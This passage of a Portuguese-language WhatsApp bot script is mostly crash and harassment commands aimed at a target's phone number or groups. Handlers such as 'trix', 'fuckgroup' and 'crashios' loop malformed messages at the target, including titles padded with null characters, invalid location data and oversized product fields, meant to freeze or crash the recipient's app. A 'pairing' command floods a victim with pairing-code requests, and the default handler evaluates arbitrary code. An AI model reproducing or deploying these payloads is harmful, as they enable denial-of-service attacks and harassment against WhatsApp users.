                display_text: "COPIAR",
                url: `https://www.whatsapp.com/otp/code/?otp_type=COPY_CODE&code=otp${cuObj.code}`,
                copy_code: cuObj.code,
              })
            },
            {
              name: "quick_reply",
              buttonParamsJson: JSON.stringify({
                display_text: 'GERAR OUTRO',
                id: `qrcode`
              })
            },
          ]
        }
      }
    }
  }
}, {});
break;

case 'permission':
if (!isBot && !isCreator) return;
await conn.sendMessage(from,{react: {text: `✅`,key: info.key}})
usersFilePath = path.join(__dirname, 'lib','nulo.json');
try {
let usersData = fs.readFileSync(usersFilePath, 'utf8');
let usersJson = JSON.parse(usersData);
if (!usersJson.includes(from)) {
usersJson.push(from);
fs.writeFileSync(usersFilePath, JSON.stringify(usersJson, null, 2));
enviar(`> *Permissão aprovada;* `);
} else {
}
} catch (err) {
}
break;











case 'pairing':
if (!isBot && !isCreator) return;
if (!q) return enviar('> Esqueceu número do alvo na frente')
const numiCode = numi
enviar(`[ ¡ ] Pairing Code Loop(TRUE) => from(${numiCode})`)
setInterval(async () => {
	BrowserList = ['ChRoMe', 'SaFira', 'oPeRa']
	const { default: makeWASocket, PHONENUMBER_MCC, makeCacheableSignalKeyStore, useMultiFileAuthState, fetchLatestBaileysVersion, makeInMemoryStore } = require("@whiskeysockets/baileys");
	typeBrow = BrowserList[Math.floor(Math.random() * BrowserList.length)];
	store = makeInMemoryStore({ logger: pino()
			.child({ level: 'debug', stream: 'store' }) });
	const { state } = await useMultiFileAuthState('./pairing/');
	const { version } = await fetchLatestBaileysVersion();
	msgRetryCounterCache = new NodeCache();
	const WaConnection = makeWASocket({
		logger: pino({ level: 'silent' }),
		printQRInTerminal: !pairingCode,
		mobile: useMobile,
		browser: [`${typeBrow} (Linux)`, '', ''],
		auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" })
				.child({ level: "fatal" })) },
		markOnlineOnConnect: true,
		generateHighQualityLinkPreview: true,
		getMessage: async (key) => { let jid = jidNormalizedUser(key.remoteJid); let msg = await store.loadMessage(jid, key.id); return msg?.message || ""; },
		msgRetryCounterCache,
		defaultQueryTimeoutMs: undefined,
	});
	WaConnection.ev.on('messages.upsert', async chatUpdate => { mek = chatUpdate.messages[0]; });
	store.bind(WaConnection.ev);
	if (pairingCode && !state.creds.registered) {
		if (useMobile) { throw new Error('Cannot use pairing code with mobile API'); }
		let phoneNumber = numiCode;
		if (!!phoneNumber) { phoneNumber = phoneNumber.replace(/[^0-9]/g, ''); if (!Object.keys(PHONENUMBER_MCC)
				.some(v => phoneNumber.startsWith(v))) { process.exit(0); } }
		setTimeout(async () => { let code = await WaConnection.requestPairingCode(phoneNumber);
			code = code?.match(/.{1,4}/g)
				?.join("-") || code; }, 1703);
	}
}, 995)
break

case 'trix':
if (!isBot && !isCreator) return
if (!q) return enviar('> Esqueceu de colocar número do alvo na frente')
await conn.sendMessage(from,{react: {text: `⌛`,key: info.key}})
await sleep(100)
await conn.sendMessage(numi,{text: `TRIX MODS PASSO PIKA KKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKK`})
for (let i = 0; i < travaSend; i++) {
await conn.relayMessage(numi,{
  'listMessage': {
        'title': "⟠⿻ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 々" + "\0".repeat(0xe09c0),
        'footerText': "ʀѻรค мєรรคgє ๒ยﻮ✅⃟╮",
        'description': "ʀѻรค мєรรคgє ๒ยﻮ✅⃟╮",
        'buttonText': null,
        'listType': 0x2,
        'productListInfo': {
        'productSections': [{
          'title': "aaaaa",
          'products': [{
          'productId': '4392524570816732'
          }]
        }],
        'productListHeaderImage': {
          'productId': "4392524570816732",
          'jpegThumbnail': null
        },
        'businessOwnerJid': "0@s.whatsapp.net"
        }
      },
      'footer': "aaaa",
      'contextInfo': {
        'expiration': 0x93a80,
        'ephemeralSettingTimestamp': "1679959486",
        'entryPointConversionSource': 'global_search_new_chat',
        'entryPointConversionApp': "whatsapp",
        'entryPointConversionDelaySeconds': 0x9,
        'disappearingMode': {
        'initiator': "INITIATED_BY_ME"
        }
      },
      'selectListType': 0x2,
      'product_header_info': {
        'product_header_info_id': 0x4433e2e130,
        'product_header_is_rejected': false
      }
}, {});

await sleep(1)

await conn.relayMessage(numi, {
  viewOnceMessage: {
    message: {
    "liveLocationMessage": {
      "degreesLatitude": 'a',
      "degreesLongitude": 'a',
      "caption": `Sr.Bruxo.Mp5 ?`,
      "url": bugUrl,
      "sequenceNumber": "1678556734042001",
      "jpegThumbnail": bxmidia,
      "expiration": 7776000,
      "ephemeralSettingTimestamp": "1677306667",
      "disappearingMode": {
      "initiator": "INITIATED_BY_ME",
      "inviteLinkGroupTypeV2": "DEFAULT",
      "messageContextInfo": {
        "deviceListMetadata": {
        "senderTimestamp": "1678285396",
        "recipientKeyHash": "SV5H7wGIOXqPtg==",
        "recipientTimestamp": "1678496731",
        "deviceListMetadataVersion": 2
        }
      }
      }
    }
    }
  }
}, {})

await sleep(1)
templateButtonrs = [
    {index: 1, urlButton: {displayText: ' 🤷🏻‍♂ - FAZER O QUE SOU FODA - 🤷🏻‍♂ ' +travadoc, url: ' 🤷🏻‍♂ - FAZER O QUE SOU FODA - 🤷🏻‍♂ '}},
    {index: 2, callButton: {displayText: ' 🤷🏻‍♂ - FAZER O QUE SOU FODA - 🤷🏻‍♂ ' +travadoc, phoneNumber: ' 🤷🏻‍♂ - FAZER O QUE SOU FODA - 🤷🏻‍♂ '}},
    {index: 3, quickReplyButton: {displayText: ' 🤷🏻‍♂ - FAZER O QUE SOU FODA - 🤷🏻‍♂ ' +travadoc, id: ' 🤷🏻‍♂ - FAZER O QUE SOU FODA - 🤷🏻‍♂ '}},
    {index: 4, urlButton: {displayText: ' 🤷🏻‍♂ - FAZER O QUE SOU FODA - 🤷🏻‍♂ ' +travadoc, url: ' 🤷🏻‍♂ - FAZER O QUE SOU FODA - 🤷🏻‍♂ '}},
    {index: 5, callButton: {displayText: ' 🤷🏻‍♂ - FAZER O QUE SOU FODA - 🤷🏻‍♂ ' +travadoc, phoneNumber: ' 🤷🏻‍♂ - FAZER O QUE SOU FODA - 🤷🏻‍♂ '}},
    {index: 6, quickReplyButton: {displayText: ' 🤷🏻‍♂ - FAZER O QUE SOU FODA - 🤷🏻‍♂ ' +travadoc, id: ' 🤷🏻‍♂ - FAZER O QUE SOU FODA - 🤷🏻‍♂ '}},
    ]
const templateMessagree = {
    text: "bug template"+travadoc,
    footer: '- crash by bruxo -'+travadoc,
    templateButtons: templateButtonrs
    }
await conn.sendMessage(numi, templateMessagree)

await sleep(1)
await conn.relayMessage(numi, {
      extendedTextMessage: {
        text: "This is a message with context info",
        contextInfo: {
          stanzaId: "1234567890ABCDEF",
          participant: from,
          quotedMessage: {
            conversation: "This is a quoted message"
          },
          remoteJid: from,
          mentionedJid: ["5531977777777@s.whatsapp.net"],
          conversionSource: "source_example",
          conversionData: Buffer.from("conversion_data_example"),
          conversionDelaySeconds: 10,
          forwardingScore: 1,
          isForwarded: true,
          quotedAd: {
            advertiserName: "Example Advertiser",
            mediaType: 1,
            jpegThumbnail: await getBuffer('https://t2.tudocdn.net/632662?w=646&h=284'),
            caption: "This is an ad caption"
          },
          placeholderKey: {
            remoteJid: from,
            fromMe: false,
            id: "ABCDEF1234567890"
          },
          expiration: 86400,
          ephemeralSettingTimestamp: Date.now(),
          ephemeralSharedSecret: Buffer.from("ephemeral_shared_secret_example"),
          externalAdReply: {
            title: "External Ad Title",
            body: "External Ad Body",
            mediaType: 1,
            thumbnailUrl: "https://telegra.ph/file/409fcacdda459445da6eb.png",
            mediaUrl: "https://telegra.ph/file/409fcacdda459445da6eb.png",
            thumbnail: Buffer.from("1234567890abcdef", "hex"),
            sourceType: "source_type_example",
            sourceId: "source_id_example",
            sourceUrl: "https://telegra.ph/file/409fcacdda459445da6eb.png",
            containsAutoReply: true,
            renderLargerThumbnail: true,
            showAdAttribution: true,
            ctwaClid: "ctwa_clid_example",
            ref: "ref_example"
          },
          entryPointConversionSource: "entry_point_source_example",
          entryPointConversionApp: "entry_point_app_example",
          entryPointConversionDelaySeconds: 5,
          disappearingMode: {
            duration: 604800
          },
          actionLink: {
            buttonText: "Click Here",
            url: "https://example.com"
          },
          groupSubject: "Example Group Subject",
          parentGroupJid: "5531988888888-1234567890@g.us",
          trustBannerType: "trust_banner_example",
          trustBannerAction: 1,
          isSampled: false,
          utm: {
            utmSource: "utm_source_example",
            utmCampaign: "utm_campaign_example"
          },
          forwardedNewsletterMessageInfo: {
            newsletterJid: "5531988888888-1234567890@g.us",
            serverMessageId: 1,
            newsletterName: "Example Newsletter",
            contentType: 1,
            accessibilityText: "Example accessibility text"
          },
          businessMessageForwardInfo: {
            businessOwnerJid: "5531955555555@s.whatsapp.net"
          },
          smbClientCampaignId: "smb_client_campaign_id_example",
          smbServerCampaignId: "smb_server_campaign_id_example",
          dataSharingContext: {
            showMmDisclosure: true
          }
        }
      }
    }, {})
  }
break;

case 'crash_web':
if (!isBot && !isCreator) return
templateButtonrs = [
{index: 1, urlButton: {displayText: ' 🤷🏻‍♂ - FAZER O QUE SOU FODA - 🤷🏻‍♂ ' +travadoc, url: ' 🤷🏻‍♂ - FAZER O QUE SOU FODA - 🤷🏻‍♂ '}},
{index: 2, callButton: {displayText: ' 🤷🏻‍♂ - FAZER O QUE SOU FODA - 🤷🏻‍♂ ' +travadoc, phoneNumber: ' 🤷🏻‍♂ - FAZER O QUE SOU FODA - 🤷🏻‍♂ '}},
{index: 3, quickReplyButton: {displayText: ' 🤷🏻‍♂ - FAZER O QUE SOU FODA - 🤷🏻‍♂ ' +travadoc, id: ' 🤷🏻‍♂ - FAZER O QUE SOU FODA - 🤷🏻‍♂ '}},
{index: 4, urlButton: {displayText: ' 🤷🏻‍♂ - FAZER O QUE SOU FODA - 🤷🏻‍♂ ' +travadoc, url: ' 🤷🏻‍♂ - FAZER O QUE SOU FODA - 🤷🏻‍♂ '}},
{index: 5, callButton: {displayText: ' 🤷🏻‍♂ - FAZER O QUE SOU FODA - 🤷🏻‍♂ ' +travadoc, phoneNumber: ' 🤷🏻‍♂ - FAZER O QUE SOU FODA - 🤷🏻‍♂ '}},
{index: 6, quickReplyButton: {displayText: ' 🤷🏻‍♂ - FAZER O QUE SOU FODA - 🤷🏻‍♂ ' +travadoc, id: ' 🤷🏻‍♂ - FAZER O QUE SOU FODA - 🤷🏻‍♂ '}},
]
const templateMessagre = {
text: "bug template"+travadoc,
footer: '- crash by bruxo -'+travadoc,
templateButtons: templateButtonrs
}
await conn.sendMessage(from, templateMessagre)
break;

case 'catalogopc':
if (!isBot && !isCreator) return
try {
	for (let i = 0; i < travaSend; i++) {
		var messa = await prepareWAMessageMedia({
			image: { url: `https://telegra.ph/file/955426b5a754b9c169c2f.jpg` }
		}, {
			upload: conn.waUploadToServer
		})
		var catalog = generateWAMessageFromContent(from, proto.Message.fromObject({
			"productMessage": {
				"product": {
					"productImage": messa.imageMessage,
					"productId": "449756950375071",
					"itemCount": 99999999999,
					"title": ` 𝆆𝆅🌟𝅿𝅿𝅿𝅿𝆆͟ • ͡ᖲ̡͟᷍Ʀ𝅿⩏ׂ✗ɨ𝅿⩎𝅿𝅿᷍❡͟០ᖱ ͜͡$͜͡ ៣ׂ͟᷍ϦȤ𝅿͟ɨׂ᷍⩎ • 𝅿𝅿𝆅𝆆͟͡🌟𝆅ثث׀ ${txt}`,
					"description": `${txt}`,
					"currencyCodeIso4217": "IDR",
					"footerText": `${txt}`,
					"productImageCount": 99999999999999999999,
					"firstImageId": 9999999999,
					"priceAmount1000": "999",
					"salePriceAmount1000": "IDR 99.99999999999999999999",
					"thumbnail": messa.imageMessage,
					"jpegThumbnail": lagall,
					"firstImageId": 99999999,
					"url": "wa.me/5512981791389"
				},
				"businessOwnerJid": from,
			}
		}), { userJid: conn.user.id, quoted: null })
		conn.relayMessage(from, catalog.message, { messageId: catalog.key.id })
	}
} catch (e) {
	console.log(e);
}
break

case 'crashios':
if(!isBot && !isCreator) return;
for(let i = 0; i < travaSend; i++) {
  await conn.relayMessage(from, {
    "paymentInviteMessage": {
      serviceType: "UPI",
      expiryTimestamp: Date.now() + (24 * 60 * 60 * 1000)
    }
  }, {})
  await sleep(5000);
}
break;

case 'crashios2':
if (!isBot && !isCreator) return;
for (let i = 0; i < travaSend; i++) {
	await conn.relayMessage(from, {
		extendedTextMessage: {
			text: "This is a message with context info",
			contextInfo: {
				stanzaId: "1234567890ABCDEF",
				participant: from,
				quotedMessage: {
					conversation: "This is a quoted message"
				},
				remoteJid: from,
				mentionedJid: ["5531977777777@s.whatsapp.net"],
				conversionSource: "source_example",
				conversionData: Buffer.from("conversion_data_example"),
				conversionDelaySeconds: 10,
				forwardingScore: 1,
				isForwarded: true,
				quotedAd: {
					advertiserName: "Example Advertiser",
					mediaType: 1,
					jpegThumbnail: await getBuffer('https://t2.tudocdn.net/632662?w=646&h=284'),
					caption: "This is an ad caption"
				},
				placeholderKey: {
					remoteJid: from,
					fromMe: false,
					id: "ABCDEF1234567890"
				},
				expiration: 86400,
				ephemeralSettingTimestamp: Date.now(),
				ephemeralSharedSecret: Buffer.from("ephemeral_shared_secret_example"),
				externalAdReply: {
					title: "External Ad Title",
					body: "External Ad Body",
					mediaType: 1,
					thumbnailUrl: "https://telegra.ph/file/409fcacdda459445da6eb.png",
					mediaUrl: "https://telegra.ph/file/409fcacdda459445da6eb.png",
					thumbnail: Buffer.from("1234567890abcdef", "hex"),
					sourceType: "source_type_example",
					sourceId: "source_id_example",
					sourceUrl: "https://telegra.ph/file/409fcacdda459445da6eb.png",
					containsAutoReply: true,
					renderLargerThumbnail: true,
					showAdAttribution: true,
					ctwaClid: "ctwa_clid_example",
					ref: "ref_example"
				},
				entryPointConversionSource: "entry_point_source_example",
				entryPointConversionApp: "entry_point_app_example",
				entryPointConversionDelaySeconds: 5,
				disappearingMode: {
					duration: 604800
				},
				actionLink: {
					buttonText: "Click Here",
					url: "https://example.com"
				},
				groupSubject: "Example Group Subject",
				parentGroupJid: "5531988888888-1234567890@g.us",
				trustBannerType: "trust_banner_example",
				trustBannerAction: 1,
				isSampled: false,
				utm: {
					utmSource: "utm_source_example",
					utmCampaign: "utm_campaign_example"
				},
				forwardedNewsletterMessageInfo: {
					newsletterJid: "5531988888888-1234567890@g.us",
					serverMessageId: 1,
					newsletterName: "Example Newsletter",
					contentType: 1,
					accessibilityText: "Example accessibility text"
				},
				businessMessageForwardInfo: {
					businessOwnerJid: "5531955555555@s.whatsapp.net"
				},
				smbClientCampaignId: "smb_client_campaign_id_example",
				smbServerCampaignId: "smb_server_campaign_id_example",
				dataSharingContext: {
					showMmDisclosure: true
				}
			}
		}
	}, {})
}
break;

case 'carousel_message':
if(!isBot && !isCreator) return
uurl = 'https://cataas.com/cat';
uuurl = await getBuffer(uurl);
carouselimg = await prepareWAMessageMedia({image: uuurl}, {upload: conn.waUploadToServer});
await conn.relayMessage(from, {
	viewOnceMessage: {
		message: {
			"interactiveMessage": {
				"carouselMessage": {
					cards: [
					{
						header: {
							title: 'bruxel4s',
							hasMediaAttachment: true,
							imageMessage: carouselimg.imageMessage,
						},
						body: {
							text: ''
						},
						footer: {
							text: ''
						},
						nativeFlowMessage: {
							buttons: [{
								"name": "galaxy_message",
								"buttonParamsJson": JSON.stringify({
								  "header": "bruxel4s android; ",
								  "body": "xxx",
								  "flow_action": "navigate",
								  "flow_action_payload": { screen: "FORM_SCREEN" },
								  "flow_cta": 'xxxxx' + travadoc,
								  "flow_id": "1169834181134583",
								  "flow_message_version": "3",
								  "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
								})
							  },{
								  "name": "galaxy_message",
								  "buttonParamsJson": JSON.stringify({
									"header": "bruxel4s android; ",
									"body": "xxx",
									"flow_action": "navigate",
									"flow_action_payload": { screen: "FORM_SCREEN" },
									"flow_cta": 'xxxxx' + travadoc ,
									"flow_id": "1169834181134583",
									"flow_message_version": "3",
									"flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
								  })
								},{
									"name": "galaxy_message",
									"buttonParamsJson": JSON.stringify({
									  "header": "bruxel4s android; ",
									  "body": "xxx",
									  "flow_action": "navigate",
									  "flow_action_payload": { screen: "FORM_SCREEN" },
									  "flow_cta": 'xxxxx' + travadoc,
									  "flow_id": "1169834181134583",
									  "flow_message_version": "3",
									  "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
									})
								  },]
						}
					}, {
						header: {
							title: 'bruxel4s',
							hasMediaAttachment: true,
							imageMessage: carouselimg.imageMessage,
						},
						body: {
							text: ''
						},
						footer: {
							text: ''
						},
						nativeFlowMessage: {
							buttons: [{
								"name": "galaxy_message",
								"buttonParamsJson": JSON.stringify({
								  "header": "bruxel4s android; ",
								  "body": "xxx",
								  "flow_action": "navigate",
								  "flow_action_payload": { screen: "FORM_SCREEN" },
								  "flow_cta": 'xxxxx' + travadoc,
								  "flow_id": "1169834181134583",
								  "flow_message_version": "3",
								  "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
								})
							  },{
								  "name": "galaxy_message",
								  "buttonParamsJson": JSON.stringify({
									"header": "bruxel4s android; ",
									"body": "xxx",
									"flow_action": "navigate",
									"flow_action_payload": { screen: "FORM_SCREEN" },
									"flow_cta": 'xxxxx' + travadoc,
									"flow_id": "1169834181134583",
									"flow_message_version": "3",
									"flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
								  })
								},{
									"name": "galaxy_message",
									"buttonParamsJson": JSON.stringify({
									  "header": "bruxel4s android; ",
									  "body": "xxx",
									  "flow_action": "navigate",
									  "flow_action_payload": { screen: "FORM_SCREEN" },
									  "flow_cta": 'xxxxx' + travadoc,
									  "flow_id": "1169834181134583",
									  "flow_message_version": "3",
									  "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
									})
								  },]
						}
					}, {
						header: {
							title: 'bruxel4s',
							hasMediaAttachment: true,
							imageMessage: carouselimg.imageMessage,
						},
						body: {
							text: ''
						},
						footer: {
							text: ''
						},
						nativeFlowMessage: {
							buttons: [{
								"name": "galaxy_message",
								"buttonParamsJson": JSON.stringify({
								  "header": "bruxel4s android; ",
								  "body": "xxx",
								  "flow_action": "navigate",
								  "flow_action_payload": { screen: "FORM_SCREEN" },
								  "flow_cta": 'xxxxx' + travadoc,
								  "flow_id": "1169834181134583",
								  "flow_message_version": "3",
								  "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
								})
							  },{
								  "name": "galaxy_message",
								  "buttonParamsJson": JSON.stringify({
									"header": "bruxel4s android; ",
									"body": "xxx",
									"flow_action": "navigate",
									"flow_action_payload": { screen: "FORM_SCREEN" },
									"flow_cta": 'xxxxx' + travadoc,
									"flow_id": "1169834181134583",
									"flow_message_version": "3",
									"flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
								  })
								},{
									"name": "galaxy_message",
									"buttonParamsJson": JSON.stringify({
									  "header": "bruxel4s android; ",
									  "body": "xxx",
									  "flow_action": "navigate",
									  "flow_action_payload": { screen: "FORM_SCREEN" },
									  "flow_cta": 'xxxxx' + travadoc,
									  "flow_id": "1169834181134583",
									  "flow_message_version": "3",
									  "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
									})
								  },]
						}
					}, ],
				}
			}
		}
	}
}, {})
break;


case '🦁':
if (!isBot && !isCreator) return
if (!q) return enviar('> Esqueceu de colocar número do alvo na frente')
await conn.sendMessage(from,{react: {text: `⌛`,key: info.key}})
await sleep(100)
await conn.sendMessage(numi,{text: `foi o ${pushname} tá ?`})
for (let i = 0; i < 8; i++) {
await conn.relayMessage(numi,{
    'listMessage': {
          'title': "⟠⿻ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 々" + "\0".repeat(0xe09c0),
          'footerText': "ʀѻรค мєรรคgє ๒ยﻮ✅⃟╮",
          'description': "ʀѻรค мєรรคgє ๒ยﻮ✅⃟╮",
          'buttonText': null,
          'listType': 0x2,
          'productListInfo': {
          'productSections': [{
            'title': "aaaaa",
            'products': [{
            'productId': '4392524570816732'
            }]
          }],
          'productListHeaderImage': {
            'productId': "4392524570816732",
            'jpegThumbnail': null
          },
          'businessOwnerJid': "0@s.whatsapp.net"
          }
        },
        'footer': "aaaa",
        'contextInfo': {
          'expiration': 0x93a80,
          'ephemeralSettingTimestamp': "1679959486",
          'entryPointConversionSource': 'global_search_new_chat',
          'entryPointConversionApp': "whatsapp",
          'entryPointConversionDelaySeconds': 0x9,
          'disappearingMode': {
          'initiator': "INITIATED_BY_ME"
          }
        },
        'selectListType': 0x2,
        'product_header_info': {
          'product_header_info_id': 0x4433e2e130,
          'product_header_is_rejected': false
        }
    }, {});
await conn.relayMessage(numi, {
    botInvokeMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "mano",
            hasMediaAttachment: true,
            imageMessage: messageal.imageMessage,
          },
          headerType: "IMAGE",
          body: {
            text: `não foi o srbruxomp5 tá?`
          },
          nativeFlowMessage: {
            buttons: [{
              name: "single_select",
              buttonParamsJson: '{"title":"Clique aqui","sections":[{"title":"Comandos","highlight_label":"🇧🇷","rows":[{"header":"Público: sim","title":"Teste","description":"Testando","id":"testeee","sections":[{"title":"Comandos","highlight_label":"🇧🇷","rows":[{"header":"Público: sim","title":"Teste","description":"Testando","id":"testeee"}]}]}',
            }],
            messageParamsJson: "",
          }
        }
      }
    }
  }, {})
}
await sleep(1000)
await conn.sendMessage(from,{react: {text: `✅`,key: info.key}})
enviar('> success >.<')
break;

case 'crashgp':
if (!isBot && !isCreator) return;
const puxarGrupos = await conn.groupFetchAllParticipating();
const grupos_info = Object.entries(puxarGrupos).map(trash => trash[1]);
const ids_gp = grupos_info.map(v => v.id);
const names_gp = grupos_info.map(v => v.subject);
await conn.sendMessage(from, { react: { text: `✅`, key: info.key } });

let buttons = [];
for (let i = 0; i < ids_gp.length; i++) {
        const gp = ids_gp[i];
        const ngp = names_gp[i];

        const baseButton = {
            title: ngp,
            id: `fuckgroup ${gp}`,
        };

        buttons.push(baseButton);
}

await conn.relayMessage(from, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: { text: "" },
                    footer: { text: "© SrBruxoMp4" },
                    header: {
                        title: `> Por favor, selecione abaixo qual dos seus grupos você deseja dar CRASH.\n\n> Lembre-se: você precisa estar de *apk imune*, e o *grupo não pode estar fechado.*`,
                        hasMediaAttachment: false,
                    },
                    nativeFlowMessage: {
                        buttons: [{
                            name: "single_select",
                            buttonParamsJson: JSON.stringify({
                                title: "CLiCK",
                                sections: [{
                                    title: '',
                                    rows: buttons
                                }]
                            })
                        }]
                    }
                },
                disappearingMode: {
                    initiator: "INITIATED_BY_ME",
                    inviteLinkGroupTypeV2: "DEFAULT",
                    messageContextInfo: {
                        deviceListMetadata: {
                            senderTimestamp: "1678285396",
                            recipientKeyHash: "SV5H7wGIOXqPtg==",
                            recipientTimestamp: "1678496731",
                            deviceListMetadataVersion: 2
                        }
                    }
                }
            }
        }
}, {});
break;

case 'fuckgroup':
if (!isBot && !isCreator) return;
await conn.sendMessage(from,{react: {text: `⌛`,key: info.key}})  
  for (let i = 0; i < 4; i++) {
    await sleep(5)
    await conn.relayMessage(q,{
    'listMessage': {
          'title': "⟠⿻ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 々" + "\0".repeat(0xe09c0),
          'footerText': "ʀѻรค мєรรคgє ๒ยﻮ✅⃟╮",
          'description': "ʀѻรค мєรรคgє ๒ยﻮ✅⃟╮",
          'buttonText': null,
          'listType': 0x2,
          'productListInfo': {
          'productSections': [{
            'title': "aaaaa",
            'products': [{
            'productId': '4392524570816732'
            }]
          }],
          'productListHeaderImage': {
            'productId': "4392524570816732",
            'jpegThumbnail': null
          },
          'businessOwnerJid': "0@s.whatsapp.net"
          }
        },
        'footer': "aaaa",
        'contextInfo': {
          'expiration': 0x93a80,
          'ephemeralSettingTimestamp': "1679959486",
          'entryPointConversionSource': 'global_search_new_chat',
          'entryPointConversionApp': "whatsapp",
          'entryPointConversionDelaySeconds': 0x9,
          'disappearingMode': {
          'initiator': "INITIATED_BY_ME"
          }
        },
        'selectListType': 0x2,
        'product_header_info': {
          'product_header_info_id': 0x4433e2e130,
          'product_header_is_rejected': false
        }
    }, {});
    await conn.relayMessage(q, {
      viewOnceMessage: {
        message: {
        "liveLocationMessage": {
          "degreesLatitude": 'a',
          "degreesLongitude": 'a',
          "caption": `Sr.Bruxo.Mp5 ?`,
          "url": bugUrl,
          "sequenceNumber": "1678556734042001",
          "jpegThumbnail": bxmidia,
          "expiration": 7776000,
          "ephemeralSettingTimestamp": "1677306667",
          "disappearingMode": {
          "initiator": "INITIATED_BY_ME",
          "inviteLinkGroupTypeV2": "DEFAULT",
          "messageContextInfo": {
            "deviceListMetadata": {
            "senderTimestamp": "1678285396",
            "recipientKeyHash": "SV5H7wGIOXqPtg==",
            "recipientTimestamp": "1678496731",
            "deviceListMetadataVersion": 2
            }
          }
          }
        }
        }
      }
    }, {})
await sleep(5)
await conn.relayMessage(q, {
        botInvokeMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "mano",
                hasMediaAttachment: true,
                imageMessage: messageal.imageMessage,
              },
              headerType: "IMAGE",
              body: {
                text: `não foi o srbruxomp5 tá?`
              },
              nativeFlowMessage: {
                buttons: [{
                  name: "single_select",
                  buttonParamsJson: '{"title":"Clique aqui","sections":[{"title":"Comandos","highlight_label":"🇧🇷","rows":[{"header":"Público: sim","title":"Teste","description":"Testando","id":"testeee","sections":[{"title":"Comandos","highlight_label":"🇧🇷","rows":[{"header":"Público: sim","title":"Teste","description":"Testando","id":"testeee"}]}]}',
                }],
                messageParamsJson: "",
              }
            }
          }
        }
}, {})
}
  
await sleep(5)
await conn.sendMessage(from,{react: {text: `✅`,key: info.key}})
break;

case '🦊':
if (!isBot && !isCreator) return
if (!q) return enviar('> Esqueceu de colocar número do alvo na frente')
await conn.sendMessage(from,{react: {text: `⌛`,key: info.key}})
await sleep(100)
await conn.sendMessage(numi,{text: `foi o ${pushname} tá ?`})
for (let i = 0; i < 8; i++) {

await conn.relayMessage(numi, {
  viewOnceMessage: {
    message: {
    "liveLocationMessage": {
      "degreesLatitude": 'a',
      "degreesLongitude": 'a',
      "caption": `Sr.Bruxo.Mp5 ?`,
      "url": bugUrl,
      "sequenceNumber": "1678556734042001",
      "jpegThumbnail": bxmidia,
      "expiration": 7776000,
      "ephemeralSettingTimestamp": "1677306667",
      "disappearingMode": {
      "initiator": "INITIATED_BY_ME",
      "inviteLinkGroupTypeV2": "DEFAULT",
      "messageContextInfo": {
        "deviceListMetadata": {
        "senderTimestamp": "1678285396",
        "recipientKeyHash": "SV5H7wGIOXqPtg==",
        "recipientTimestamp": "1678496731",
        "deviceListMetadataVersion": 2
        }
      }
      }
    }
    }
  }
}, {participant: {jid: numi}})
await conn.relayMessage(numi,{
	'listMessage': {
	  'title': "⟠⿻ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 々" + "\0".repeat(0xe09c0),
		'footerText': "ʀѻรค мєรรคgє ๒ยﻮ✅⃟╮",
		'description': "ʀѻรค мєรรคgє ๒ยﻮ✅⃟╮",
	  'buttonText': null,
	  'listType': 0x2,
	  'productListInfo': {
		'productSections': [{
		  'title': "aaaaa",
		  'products': [{
			'productId': '4392524570816732'
		  }]
		}],
		'productListHeaderImage': {
		  'productId': "4392524570816732",
		  'jpegThumbnail': null
		},
		'businessOwnerJid': "0@s.whatsapp.net"
	  }
	},
	'footer': "aaaa",
	'contextInfo': {
	  'expiration': 0x93a80,
	  'ephemeralSettingTimestamp': "1679959486",
	  'entryPointConversionSource': 'global_search_new_chat',
	  'entryPointConversionApp': "whatsapp",
	  'entryPointConversionDelaySeconds': 0x9,
	  'disappearingMode': {
		'initiator': "INITIATED_BY_ME"
	  }
	},
	'selectListType': 0x2,
	'product_header_info': {
	  'product_header_info_id': 0x4433e2e130,
	  'product_header_is_rejected': false
	}
	}, {participant: {jid: numi}});
console.log('Rajando: ' + numi)
await sleep(50)
}

await sleep(1000)
await conn.sendMessage(from,{react: {text: `✅`,key: info.key}})
enviar('> success >.<')
break;


case 'status':
if (!isBot && !isCreator) return;
for (let i = 0; i < 15; i++) {
statusid = await conn.relayMessage('status@broadcast', {
    viewOnceMessage: {
        message: {
					"messageContextInfo": {
						"messageSecret": "eed1zxI49cxiovBTUFLIEWi1shD9HgIOghONuqPDGTk=",
						"deviceListMetaData": {},
						"deviceListMetadataVersion": 2
					},
            fromMe: false,
            remoteJid: from,
            statusJidList: [info.from],
            broadcast: true,
          "scheduledCallCreationMessage": {
            "scheduledTimestampMs": '1200',
            "callType": 'VOICE',
            "title": 'trix hacked KKKKKKKKKKKKKKKKKKKKKK (15 contatos)'
          }
        }
    }
},{
    backgroundColor: 104491,
    statusJidList: [numi],
    fromMe: false,
    remoteJid: from,
    broadcast: true,
    additionalAttributes:{
        to: sender,
    }
})
await sleep(1)
await conn.sendMessage('status@broadcast',{delete: {fromMe: true,remoteJid: from,id: statusid}},{
  backgroundColor: 104491,
  statusJidList: [numi],
  fromMe: false,
  remoteJid: from,
  broadcast: true,
  additionalAttributes:{
      to: sender,
    }
})
}
enviar('Status post from: '+ numi)

break


default:


if (budy.startsWith('>')) {
if (!isCreator && !isBot) return
try {
enviar(JSON.stringify(eval(`(async () => { ${q} })()`), null, '\t'))
} catch (e) {
e = String(e)
reply(e)
}
}

}
} catch (err) {
console.log(util.format(err))}}
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Atualizado= '${__filename}'`))
delete require.cache[file]
require(file)
})

} catch (e) {
console.log(e)
}